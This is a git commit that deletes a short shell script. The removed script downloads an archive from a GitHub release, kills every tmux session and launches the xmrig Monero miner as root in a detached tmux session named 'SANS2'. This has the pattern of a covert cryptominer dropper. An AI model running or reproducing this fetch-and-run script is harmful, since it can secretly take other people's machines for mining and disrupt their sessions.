223eaab887b0153135feaf30c47f500f7f60df26
vnxxx <85277031+vnxxx@users.noreply.github.com>
2021-09-27 19:19:22 +0700

    Delete startvn.sh

--- startvn.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/sh
-cd /usr/local/bin/
-wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/winxmr.tar.gz
-tar -zxvf winxmr.tar.gz
-tmux kill-server
-sleep 1
-sudo tmux new-session -d -s SANS2 './xmrig-v5.11.1/xmrig'
